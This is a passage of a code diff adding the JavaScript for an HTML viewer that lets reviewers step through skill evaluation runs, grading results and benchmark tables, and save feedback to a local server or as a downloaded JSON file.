1.0, "max": 1.0}, "time_seconds": {"mean": 92.25, "stddev": 26.2337, "min": 73.7, "max": 110.8}, "tokens": {"mean": 8016.5, "stddev": 1174.5044, "min": 7186, "max": 8847}}, "without_skill": {"pass_rate": {"mean": 0.945, "stddev": 0.0778, "min": 0.89, "max": 1.0}, "time_seconds": {"mean": 87.7, "stddev": 8.061, "min": 82.0, "max": 93.4}, "tokens": {"mean": 6353.0, "stddev": 366.2813, "min": 6094, "max": 6612}}, "delta": {"pass_rate": "+0.06", "time_seconds": "+4.5", "tokens": "+1664"}}, "notes": []}};
+
+    // ---- State ----
+    let feedbackMap = {};  // run_id -> feedback text
+    let currentIndex = 0;
+    let visitedRuns = new Set();
+
+    // ---- Init ----
+    async function init() {
+      // Load saved feedback from server — but only if this isn't a fresh
+      // iteration (indicated by previous_feedback being present). When
+      // previous feedback exists, the feedback.json on disk is stale from
+      // the prior iteration and should not pre-fill the textareas.
+      const hasPrevious = Object.keys(EMBEDDED_DATA.previous_feedback || {}).length > 0
+        || Object.keys(EMBEDDED_DATA.previous_outputs || {}).length > 0;
+      if (!hasPrevious) {
+        try {
+          const resp = await fetch("/api/feedback");
+          const data = await resp.json();
+          if (data.reviews) {
+            for (const r of data.reviews) feedbackMap[r.run_id] = r.feedback;
+          }
+        } catch { /* first run, no feedback yet */ }
+      }
+
+      document.getElementById("skill-name").textContent = EMBEDDED_DATA.skill_name;
+      showRun(0);
+
+      // Wire up feedback auto-save
+      const textarea = document.getElementById("feedback");
+      let saveTimeout = null;
+      textarea.addEventListener("input", () => {
+        clearTimeout(saveTimeout);
+        document.getElementById("feedback-status").textContent = "";
+        saveTimeout = setTimeout(() => saveCurrentFeedback(), 800);
+      });
+    }
+
+    // ---- Navigation ----
+    function navigate(delta) {
+      const newIndex = currentIndex + delta;
+      if (newIndex >= 0 && newIndex < EMBEDDED_DATA.runs.length) {
+        saveCurrentFeedback();
+        showRun(newIndex);
+      }
+    }
+
+    function updateNavButtons() {
+      document.getElementById("prev-btn").disabled = currentIndex === 0;
+      document.getElementById("next-btn").disabled =
+        currentIndex === EMBEDDED_DATA.runs.length - 1;
+    }
+
+    // ---- Show a run ----
+    function showRun(index) {
+      currentIndex = index;
+      const run = EMBEDDED_DATA.runs[index];
+
+      // Progress
+      document.getElementById("progress").textContent =
+        `${index + 1} of ${EMBEDDED_DATA.runs.length}`;
+
+      // Prompt
+      document.getElementById("prompt-text").textContent = run.prompt;
+
+      // Config badge
+      const badge = document.getElementById("config-badge");
+      const configMatch = run.id.match(/(with_skill|without_skill|new_skill|old_skill)/);
+      if (configMatch) {
+        const config = configMatch[1];
+        const isBaseline = config === "without_skill" || config === "old_skill";
+        badge.textContent = config.replace(/_/g, " ");
+        badge.className = "config-badge " + (isBaseline ? "config-baseline" : "config-primary");
+        badge.style.display = "inline-block";
+      } else {
+        badge.style.display = "none";
+      }
+
+      // Outputs
+      renderOutputs(run);
+
+      // Previous outputs
+      renderPrevOutputs(run);
+
+      // Grades
+      renderGrades(run);
+
+      // Previous feedback
+      const prevFb = (EMBEDDED_DATA.previous_feedback || {})[run.id];
+      const prevEl = document.getElementById("prev-feedback");
+      if (prevFb) {
+        document.getElementById("prev-feedback-text").textContent = prevFb;
+        prevEl.style.display = "block";
+      } else {
+        prevEl.style.display = "none";
+      }
+
+      // Feedback
+      document.getElementById("feedback").value = feedbackMap[run.id] || "";
+      document.getElementById("feedback-status").textContent = "";
+
+      updateNavButtons();
+
+      // Track visited runs and promote done button when all visited
+      visitedRuns.add(index);
+      const doneBtn = document.getElementById("done-btn");
+      if (visitedRuns.size >= EMBEDDED_DATA.runs.length) {
+        doneBtn.classList.add("ready");
+      }
+
+      // Scroll main content to top
+      document.querySelector(".main").scrollTop = 0;
+    }
+
+    // ---- Render outputs ----
+    function renderOutputs(run) {
+      const container = document.getElementById("outputs-body");
+      container.innerHTML = "";
+
+      const outputs = run.outputs || [];
+      if (outputs.length === 0) {
+        container.innerHTML = '<div class="empty-state">No output files</div>';
+        return;
+      }
+
+      for (const file of outputs) {
+        const fileDiv = document.createElement("div");
+        fileDiv.className = "output-file";
+
+        // Always show file header with download link
+        const header = document.createElement("div");
+        header.className = "output-file-header";
+        const nameSpan = document.createElement("span");
+        nameSpan.textContent = file.name;
+        header.appendChild(nameSpan);
+        const dlBtn = document.createElement("a");
+        dlBtn.className = "dl-btn";
+        dlBtn.textContent = "Download";
+        dlBtn.download = file.name;
+        dlBtn.href = getDownloadUri(file);
+        header.appendChild(dlBtn);
+        fileDiv.appendChild(header);
+
+        const content = document.createElement("div");
+        content.className = "output-file-content";
+
+        if (file.type === "text") {
+          const pre = document.createElement("pre");
+          pre.textContent = file.content;
+          content.appendChild(pre);
+        } else if (file.type === "image") {
+          const img = document.createElement("img");
+          img.src = file.data_uri;
+          img.alt = file.name;
+          content.appendChild(img);
+        } else if (file.type === "pdf") {
+          const iframe = document.createElement("iframe");
+          iframe.src = file.data_uri;
+          content.appendChild(iframe);
+        } else if (file.type === "xlsx") {
+          renderXlsx(content, file.data_b64);
+        } else if (file.type === "binary") {
+          const a = document.createElement("a");
+          a.className = "download-link";
+          a.href = file.data_uri;
+          a.download = file.name;
+          a.textContent = "Download " + file.name;
+          content.appendChild(a);
+        } else if (file.type === "error") {
+          const pre = document.createElement("pre");
+          pre.textContent = file.content;
+          pre.style.color = "var(--red)";
+          content.appendChild(pre);
+        }
+
+        fileDiv.appendChild(content);
+        container.appendChild(fileDiv);
+      }
+    }
+
+    // ---- XLSX rendering via SheetJS ----
+    function renderXlsx(container, b64Data) {
+      try {
+        const raw = Uint8Array.from(atob(b64Data), c => c.charCodeAt(0));
+        const wb = XLSX.read(raw, { type: "array" });
+
+        for (let i = 0; i < wb.SheetNames.length; i++) {
+          const sheetName = wb.SheetNames[i];
+          const ws = wb.Sheets[sheetName];
+
+          if (wb.SheetNames.length > 1) {
+            const sheetLabel = document.createElement("div");
+            sheetLabel.style.cssText =
+              "font-weight:600; font-size:0.8rem; color:#b0aea5; margin-top:0.5rem; margin-bottom:0.25rem;";
+            sheetLabel.textContent = "Sheet: " + sheetName;
+            container.appendChild(sheetLabel);
+          }
+
+          const htmlStr = XLSX.utils.sheet_to_html(ws, { editable: false });
+          const wrapper = document.createElement("div");
+          wrapper.innerHTML = htmlStr;
+          container.appendChild(wrapper);
+        }
+      } catch (err) {
+        container.textContent = "Error rendering spreadsheet: " + err.message;
+      }
+    }
+
+    // ---- Grades ----
+    function renderGrades(run) {
+      const section = document.getElementById("grades-section");
+      const content = document.getElementById("grades-content");
+
+      if (!run.grading) {
+        section.style.display = "none";
+        return;
+      }
+
+      const grading = run.grading;
+      section.style.display = "block";
+      // Reset to collapsed
+      content.classList.remove("open");
+      document.getElementById("grades-arrow").classList.remove("open");
+
+      const summary = grading.summary || {};
+      const expectations = grading.expectations || [];
+
+      let html = '<div style="padding: 1rem;">';
+
+      // Summary line
+      const passRate = summary.pass_rate != null
+        ? Math.round(summary.pass_rate * 100) + "%"
+        : "?";
+      const badgeClass = summary.pass_rate >= 0.8 ? "grade-pass" : summary.pass_rate >= 0.5 ? "" : "grade-fail";
+      html += '<div class="grades-summary">';
+      html += '<span class="grade-badge ' + badgeClass + '">' + passRate + '</span>';
+      html += '<span>' + (summary.passed || 0) + ' passed, ' + (summary.failed || 0) + ' failed of ' + (summary.total || 0) + '</span>';
+      html += '</div>';
+
+      // Assertions list
+      html += '<ul class="assertion-list">';
+      for (const exp of expectations) {
+        const statusClass = exp.passed ? "pass" : "fail";
+        const statusIcon = exp.passed ? "\u2713" : "\u2717";
+        html += '<li class="assertion-item">';
+        html += '<span class="assertion-status ' + statusClass + '">' + statusIcon + '</span>';
+        html += '<span>' + escapeHtml(exp.text) + '</span>';
+        if (exp.evidence) {
+          html += '<div class="assertion-evidence">' + escapeHtml(exp.evidence) + '</div>';
+        }
+        html += '</li>';
+      }
+      html += '</ul>';
+
+      html += '</div>';
+      content.innerHTML = html;
+    }
+
+    function toggleGrades() {
+      const content = document.getElementById("grades-content");
+      const arrow = document.getElementById("grades-arrow");
+      content.classList.toggle("open");
+      arrow.classList.toggle("open");
+    }
+
+    // ---- Previous outputs (collapsible) ----
+    function renderPrevOutputs(run) {
+      const section = document.getElementById("prev-outputs-section");
+      const content = document.getElementById("prev-outputs-content");
+      const prevOutputs = (EMBEDDED_DATA.previous_outputs || {})[run.id];
+
+      if (!prevOutputs || prevOutputs.length === 0) {
+        section.style.display = "none";
+        return;
+      }
+
+      section.style.display = "block";
+      // Reset to collapsed
+      content.classList.remove("open");
+      document.getElementById("prev-outputs-arrow").classList.remove("open");
+
+      // Render the files into the content area
+      content.innerHTML = "";
+      const wrapper = document.createElement("div");
+      wrapper.style.padding = "1rem";
+
+      for (const file of prevOutputs) {
+        const fileDiv = document.createElement("div");
+        fileDiv.className = "output-file";
+
+        const header = document.createElement("div");
+        header.className = "output-file-header";
+        const nameSpan = document.createElement("span");
+        nameSpan.textContent = file.name;
+        header.appendChild(nameSpan);
+        const dlBtn = document.createElement("a");
+        dlBtn.className = "dl-btn";
+        dlBtn.textContent = "Download";
+        dlBtn.download = file.name;
+        dlBtn.href = getDownloadUri(file);
+        header.appendChild(dlBtn);
+        fileDiv.appendChild(header);
+
+        const fc = document.createElement("div");
+        fc.className = "output-file-content";
+
+        if (file.type === "text") {
+          const pre = document.createElement("pre");
+          pre.textContent = file.content;
+          fc.appendChild(pre);
+        } else if (file.type === "image") {
+          const img = document.createElement("img");
+          img.src = file.data_uri;
+          img.alt = file.name;
+          fc.appendChild(img);
+        } else if (file.type === "pdf") {
+          const iframe = document.createElement("iframe");
+          iframe.src = file.data_uri;
+          fc.appendChild(iframe);
+        } else if (file.type === "xlsx") {
+          renderXlsx(fc, file.data_b64);
+        } else if (file.type === "binary") {
+          const a = document.createElement("a");
+          a.className = "download-link";
+          a.href = file.data_uri;
+          a.download = file.name;
+          a.textContent = "Download " + file.name;
+          fc.appendChild(a);
+        }
+
+        fileDiv.appendChild(fc);
+        wrapper.appendChild(fileDiv);
+      }
+
+      content.appendChild(wrapper);
+    }
+
+    function togglePrevOutputs() {
+      const content = document.getElementById("prev-outputs-content");
+      const arrow = document.getElementById("prev-outputs-arrow");
+      content.classList.toggle("open");
+      arrow.classList.toggle("open");
+    }
+
+    // ---- Feedback (saved to server -> feedback.json) ----
+    function saveCurrentFeedback() {
+      const run = EMBEDDED_DATA.runs[currentIndex];
+      const text = document.getElementById("feedback").value;
+
+      if (text.trim() === "") {
+        delete feedbackMap[run.id];
+      } else {
+        feedbackMap[run.id] = text;
+      }
+
+      // Build reviews array from map
+      const reviews = [];
+      for (const [run_id, feedback] of Object.entries(feedbackMap)) {
+        if (feedback.trim()) {
+          reviews.push({ run_id, feedback, timestamp: new Date().toISOString() });
+        }
+      }
+
+      fetch("/api/feedback", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ reviews, status: "in_progress" }),
+      }).then(() => {
+        document.getElementById("feedback-status").textContent = "Saved";
+      }).catch(() => {
+        // Static mode or server unavailable — no-op on auto-save,
+        // feedback will be downloaded on final submit
+        document.getElementById("feedback-status").textContent = "Will download on submit";
+      });
+    }
+
+    // ---- Done ----
+    function showDoneDialog() {
+      // Save current textarea to feedbackMap (but don't POST yet)
+      const run = EMBEDDED_DATA.runs[currentIndex];
+      const text = document.getElementById("feedback").value;
+      if (text.trim() === "") {
+        delete feedbackMap[run.id];
+      } else {
+        feedbackMap[run.id] = text;
+      }
+
+      // POST once with status: complete — include ALL runs so the model
+      // can distinguish "no feedback" (looks good) from "not reviewed"
+      const reviews = [];
+      const ts = new Date().toISOString();
+      for (const r of EMBEDDED_DATA.runs) {
+        reviews.push({ run_id: r.id, feedback: feedbackMap[r.id] || "", timestamp: ts });
+      }
+      const payload = JSON.stringify({ reviews, status: "complete" }, null, 2);
+      fetch("/api/feedback", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: payload,
+      }).then(() => {
+        document.getElementById("done-overlay").classList.add("visible");
+      }).catch(() => {
+        // Server not available (static mode) — download as file
+        const blob = new Blob([payload], { type: "application/json" });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = "feedback.json";
+        a.click();
+        URL.revokeObjectURL(url);
+        document.getElementById("done-overlay").classList.add("visible");
+      });
+    }
+
+    function closeDoneDialog() {
+      // Reset status back to in_progress
+      saveCurrentFeedback();
+      document.getElementById("done-overlay").classList.remove("visible");
+    }
+
+    // ---- Toast ----
+    function showToast(message) {
+      const toast = document.getElementById("toast");
+      toast.textContent = message;
+      toast.classList.add("visible");
+      setTimeout(() => toast.classList.remove("visible"), 2000);
+    }
+
+    // ---- Keyboard nav ----
+    document.addEventListener("keydown", (e) => {
+      // Don't capture when typing in textarea
+      if (e.target.tagName === "TEXTAREA") return;
+
+      if (e.key === "ArrowLeft" || e.key === "ArrowUp") {
+        e.preventDefault();
+        navigate(-1);
+      } else if (e.key === "ArrowRight" || e.key === "ArrowDown") {
+        e.preventDefault();
+        navigate(1);
+      }
+    });
+
+    // ---- Util ----
+    function getDownloadUri(file) {
+      if (file.data_uri) return file.data_uri;
+      if (file.data_b64) return "data:application/octet-stream;base64," + file.data_b64;
+      if (file.type === "text") return "data:text/plain;charset=utf-8," + encodeURIComponent(file.content);
+      return "#";
+    }
+
+    function escapeHtml(text) {
+      const div = document.createElement("div");
+      div.textContent = text;
+      return div.innerHTML;
+    }
+
+    // ---- View switching ----
+    function switchView(view) {
+      document.querySelectorAll(".view-tab").forEach(t => t.classList.remove("active"));
+      document.querySelectorAll(".view-panel").forEach(p => p.classList.remove("active"));
+      document.querySelector(`[onclick="switchView('${view}')"]`).classList.add("active");
+      document.getElementById("panel-" + view).classList.add("active");
+    }
+
+    // ---- Benchmark rendering ----
+    function renderBenchmark() {
+      const data = EMBEDDED_DATA.benchmark;
+      if (!data) return;
+
+      // Show the tabs
+      document.getElementById("view-tabs").style.display = "flex";
+
+      const container = document.getElementById("benchmark-content");
+      const summary = data.run_summary || {};
+      const metadata = data.metadata || {};
+      const notes = data.notes || [];
+
+      let html = "";
+
+      // Header
+      html += "<h2 style='font-family: Poppins, sans-serif; margin-bottom: 0.5rem;'>Benchmark Results</h2>";
+      html += "<p style='color: var(--text-muted); font-size: 0.875rem; margin-bottom: 1.25rem;'>";
+      if (metadata.skill_name) html += "<strong>" + escapeHtml(metadata.skill_name) + "</strong> &mdash; ";
+      if (metadata.timestamp) html += metadata.timestamp + " &mdash; ";
+      if (metadata.evals_run) html += "Evals: " + metadata.evals_run.join(", ") + " &mdash; ";
+      html += (metadata.runs_per_configuration || "?") + " runs per configuration";
+      html += "</p>";
+
+      // Summary table
+      html += '<table class="benchmark-table">';
+
+      function fmtStat(stat, pct) {
+        if (!stat) return "—";
+        const suffix = pct ? "%" : "";
+        const m = pct ? (stat.mean * 100).toFixed(0) : stat.mean.toFixed(1);
+        const s = pct ? (stat.stddev * 100).toFixed(0) : stat.stddev.toFixed(1);
+        return m + suffix + " ± " + s + suffix;
+      }
+
+      function deltaClass(val) {
+        if (!val) return "";
+        const n = parseFloat(val);
+        if (n > 0) return "benchmark-delta-positive";
+        if (n < 0) return "benchmark-delta-negative";
+        return "";
+      }
+
+      // Discover config names dynamically (everything except "delta")
+      const configs = Object.keys(summary).filter(k => k !== "delta");
+      const configA = configs[0] || "config_a";
+      const configB = configs[1] || "config_b";
+      const labelA = configA.replace(/_/g, " ").replace(/\b\w/g, c => c.toUpperCase());
+      const labelB = configB.replace(/_/g, " ").replace(/\b\w/g, c => c.toUpperCase());
+      const a = summary[configA] || {};
+      const b = summary[configB] || {};
+      const delta = summary.delta || {};
+
+      html += "<thead><tr><th>Metric</th><th>" + escapeHtml(labelA) + "</th><th>" + escapeHtml(labelB) + "</th><th>Delta</th></tr></thead>";
+      html += "<tbody>";
+
+      html += "<tr><td><strong>Pass Rate</strong></td>";
+      html += "<td>" + fmtStat(a.pass_rate, true) + "</td>";
+      html += "<td>" + fmtStat(b.pass_rate, true) + "</td>";
+      html += '<td class="' + deltaClass(delta.pass_rate) + '">' + (delta.pass_rate || "—") + "</td></tr>";
+
+      // Time (only show row if data exists)
+      if (a.time_seconds || b.time_seconds) {
+        html += "<tr><td><strong>Time (s)</strong></td>";
+        html += "<td>" + fmtStat(a.time_seconds, false) + "</td>";
+        html += "<td>" + fmtStat(b.time_seconds, false) + "</td>";
+        html += '<td class="' + deltaClass(delta.time_seconds) + '">' + (delta.time_seconds ? delta.time_seconds + "s" : "—") + "</td></tr>";
+      }
+
+      // Tokens (only show row if data exists)
+      if (a.tokens || b.tokens) {
+        html += "<tr><td><strong>Tokens</strong></td>";
+        html += "<td>" + fmtStat(a.tokens, false) + "</td>";
+        html += "<td>" + fmtStat(b.tokens, false) + "</td>";
+        html += '<td class="' + deltaClass(delta.tokens) + '">' + (delta.tokens || "—") + "</td></tr>";
+      }
+
+      html += "</tbody></table>";
+
+      // Per-eval breakdown (if runs data available)
+      const runs = data.runs || [];
+      if (runs.length > 0) {
+        const evalIds = [...new Set(runs.map(r => r.eval_id))].sort((a, b) => a - b);
+
+        html += "<h3 style='font-family: Poppins, sans-serif; margin-bottom: 0.75rem;'>Per-Eval Breakdown</h3>";
+
+        const hasTime = runs.some(r => r.result && r.result.time_seconds != null);
+        const hasErrors = runs.some(r => r.result && r.result.errors > 0);
+
+        for (const evalId of evalIds) {
+          const evalRuns = runs.filter(r => r.eval_id === evalId);
+          const evalName = evalRuns[0] && evalRuns[0].eval_name ? evalRuns[0].eval_name : "Eval " + evalId;
+
+          html += "<h4 style='font-family: Poppins, sans-serif; margin: 1rem 0 0.5rem; color: var(--text);'>" + escapeHtml(evalName) + "</h4>";
+          html += '<table class="benchmark-table">';
+          html += "<thead><tr><th>Config</th><th>Run</th><th>Pass Rate</th>";
+          if (hasTime) html += "<th>Time (s)</th>";
+          if (hasErrors) html += "<th>Crashes During Execution</th>";
+          html += "</tr></thead>";
+          html += "<tbody>";
+
+          // Group by config and render with average rows
+          const configGroups = [...new Set(evalRuns.map(r => r.configuration))];
+          for (let ci = 0; ci < configGroups.length; ci++) {
+            const config = configGroups[ci];
+            const configRuns = evalRuns.filter(r => r.configuration === config);
+            if (configRuns.length === 0) continue;
+
+            const rowClass = ci === 0 ? "benchmark-row-with" : "benchmark-row-without";
+            const configLabel = config.replace(/_/g, " ").replace(/\b\w/g, c => c.toUpperCase());
+
+            for (const run of configRuns) {
+              const r = run.result || {};
+              const prClass = r.pass_rate >= 0.8 ? "benchmark-delta-positive" : r.pass_rate < 0.5 ? "benchmark-delta-negative" : "";
+              html += '<tr class="' + rowClass + '">';
+              html += "<td>" + configLabel + "</td>";
+              html += "<td>" + run.run_number + "</td>";
+              html += '<td class="' + prClass + '">' + ((r.pass_rate || 0) * 100).toFixed(0) + "% (" + (r.passed || 0) + "/" + (r.total || 0) + ")</td>";
+              if (hasTime) html += "<td>" + (r.time_seconds != null ? r.time_seconds.toFixed(1) : "—") + "</td>";
+              if (hasErrors) html += "<td>" + (r.errors || 0) + "</td>";
+              html += "</tr>";
+            }
+
+            // Average row
+            const rates = configRuns.map(r => (r.result || {}).pass_rate || 0);
+            const avgRate = rates.reduce((a, b) => a + b, 0) / rates.length;
+            const avgPrClass = avgRate >= 0.8 ? "benchmark-delta-positive" : avgRate < 0.5 ? "benchmark-delta-negative" : "";
+            html += '<tr class="benchmark-row-avg ' + rowClass + '">';
+            html += "<td>" + configLabel + "</td>";
+            html += "<td>Avg</td>";
+            html += '<td class="' + avgPrClass + '">' + (avgRate * 100).toFixed(0) + "%</td>";
+            if (hasTime) {
+              const times = configRuns.map(r => (r.result || {}).time_seconds).filter(t => t != null);
+              html += "<td>" + (times.length ? (times.reduce((a, b) => a + b, 0) / times.length).toFixed(1) : "—") + "</td>";
+            }
+            if (hasErrors) html += "<td></td>";
+            html += "</tr>";
+          }
+          html += "</tbody></table>";
+
+          // Per-assertion detail for this eval
+          const runsWithExpectations = {};
+          for (const config of configGroups) {
+            runsWithExpectations[config] = evalRuns.filter(r => r.configuration === config && r.expectations && r.expectations.length > 0);
+          }
+          const hasAnyExpectations = Object.values(runsWithExpectations).some(runs => runs.length > 0);
+          if (hasAnyExpectations) {
+            // Collect all unique assertion texts across all configs
+            const allAssertions = [];
+            const seen = new Set();
+            for (const config of configGroups) {
+              for (const run of runsWithExpectations[config]) {
+                for (const exp of (run.expectations || [])) {
+                  if (!seen.has(exp.text)) {
+                    seen.add(exp.text);
+                    allAssertions.push(exp.text);
+                  }
+                }
+              }
+            }
+
+            html += '<table class="benchmark-table" style="margin-top: 0.5rem;">';
+            html += "<thead><tr><th>Assertion</th>";
+            for (const config of configGroups) {
+              const label = config.replace(/_/g, " ").replace(/\b\w/g, c => c.toUpperCase());
+              html += "<th>" + escapeHtml(label) + "</th>";
+            }
+            html += "</tr></thead><tbody>";
+
+            for (const assertionText of allAssertions) {
+              html += "<tr><td>" + escapeHtml(assertionText) + "</td>";
+
+              for (const config of configGroups) {
+                html += "<td>";
+                for (const run of runsWithExpectations[config]) {
+                  const exp = (run.expectations || []).find(e => e.text === assertionText);
+                  if (exp) {
+                    const cls = exp.passed ? "benchmark-delta-positive" : "benchmark-delta-negative";
+                    const icon = exp.passed ? "\u2713" : "\u2717";
+                    html += '<span class="' + cls + '" title="Run ' + run.run_number + ': ' + escapeHtml(exp.evidence || "") + '">' + icon + "</span> ";
+                  } else {
+                    html += "— ";
+                  }
+                }
+                html += "</td>";
+              }
+              html += "</tr>";
+            }
+            html += "</tbody></table>";
+          }
+        }
+      }
+
+      // Notes
+      if (notes.length > 0) {
+        html += '<div class="benchmark-notes">';
+        html += "<h3>Analysis Notes</h3>";
+        html += "<ul>";
+        for (const note of notes) {
+          html += "<li>" + escapeHtml(note) + "</li>";
+        }
+        html += "</ul></div>";
+      }
+
+      container.innerHTML = html;
+    }
+
+    // ---- Start ----
+    init();
+    renderBenchmark();
+  </script>
+</body>
+</html>
